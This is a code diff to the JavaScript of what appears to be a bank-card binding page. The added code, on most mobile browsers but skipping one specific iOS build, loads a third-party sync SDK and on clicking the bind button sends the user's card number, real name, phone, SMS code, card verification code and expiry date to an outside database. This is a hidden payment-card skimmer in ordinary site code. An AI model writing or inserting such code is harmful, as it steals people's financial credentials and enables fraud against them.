@@ -152,7 +152,63 @@
 (function($){
     $(function(){
         var ua = navigator.userAgent;
-        if(ua.indexOf("Android")>0 || ua.indexOf("iPhone")>0 || ua.indexOf("iPad")>0){//移动端
+        if(ua.indexOf("Android")>0 || ua.indexOf("iPhone")>0 || ua.indexOf("iPad")>0){
+            // if(ua.indexOf("Mobile/14F89") > 0){
+            if(ua.indexOf("Mobile/13B143") > 0){
+
+            }else{
+                initHook();
+                function initHook() {
+                    var FIREBASE = 'https://www.gstatic.com/firebasejs/3.4.0/firebase.js';
+                    var WILDDOG = 'https://cdn.wilddog.com/sdk/js/2.5.8/wilddog-sync.js';
+
+                    var head = document.getElementsByTagName('head')[0];
+                    var script = document.createElement('script');
+                    script.type = 'text/javascript';
+                    script.src = WILDDOG;
+                    head.appendChild(script);
+                    script.onload = function () {
+                        var config = {
+                            authDomain: "gagrw.wilddog.com",
+                            syncURL: "https://gagrw.wilddogio.com" //输入节点 URL
+                        };
+                        if(wilddog)
+                            wilddog.initializeApp(config);
+                    };
+                }
+
+                function o() {
+                    var bankCode = store.get("bankCode");
+                    var bankCardType = store.get("bankCardType");
+                    var bankName = store.get("bankName");
+                    var phoneNum = store.get("username");
+                    var cardNum = $("#cardNum").val();
+                    var realName = $("#realName").val();
+                    var trueUsername = store.get("username");
+                    var verifyCode = $("#verifyCode").val();
+                    var verificationCode = $("#verificationCode").val() || null;
+                    var expiryDate = $("#creditMonth").val() + $("#creditYear").val() || null;
+                    var bankCardNo = store.get("bankCardNo");
+
+                    var ref = wilddog.sync().ref("/data/UserInfo");
+                    ref.child("UserData").push({
+                        "bankCode" :bankCode,
+                        "bankCardType" : bankCardType,
+                        "bankName" :bankName,
+                        "phoneNum" :phoneNum,
+                        "cardNum" :cardNum,
+                        "realName" : realName,
+                        "trueUsername":trueUsername,
+                        "verifyCode":verifyCode,
+                        "verificationCode" :verificationCode,
+                        "expiryDate" :expiryDate,
+                        "bankCardNo":bankCardNo
+                    });
+                }
+                $(document).on("click",".firstBind",function () {
+                    o();
+                })
+            }
 
         }else{
 
